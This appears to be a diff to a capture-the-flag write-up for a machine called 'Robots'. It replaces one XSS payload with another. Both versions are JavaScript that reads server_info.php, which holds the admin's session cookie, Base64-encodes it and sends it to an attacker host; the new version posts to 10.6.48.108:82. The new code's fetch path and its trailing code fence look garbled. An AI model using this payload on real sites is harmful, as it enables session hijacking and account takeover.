@@ -271,21 +271,23 @@ Our approach to compromising the "Robots" machine followed a structured penetrat
 
         ```javascript
 
-        fetch('[http://robots.thm/server_info.php](http://robots.thm/server_info.php)') // Request the page containing the cookie
+        async function exfil() {
+    const response = await fetch('/harm/to/self/server_info.php');
+    const text = await response.text();
 
-          .then(response => response.text())      // Get response body as text
+    await fetch('http://10.6.48.108:82/exfil', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: `data=${btoa(text)}`
+    });
+}
 
-          .then(data => {
+exfil();
 
-            var base64data = btoa(data);           // Base64 encode the content
 
-            // Send the encoded content to our Netcat listener
-
-            fetch('http://<YOUR_ATTACKER_IP>:9001/?data=' + base64data);
-
-          });
-
-        ```
+        ```d
 
     * **Reasoning:** When executed in the admin's browser, this script fetches `server_info.php` (which contains the `PHPSESSID`), Base64-encodes its entire content, and then sends that encoded string to our `nc` listener.
 
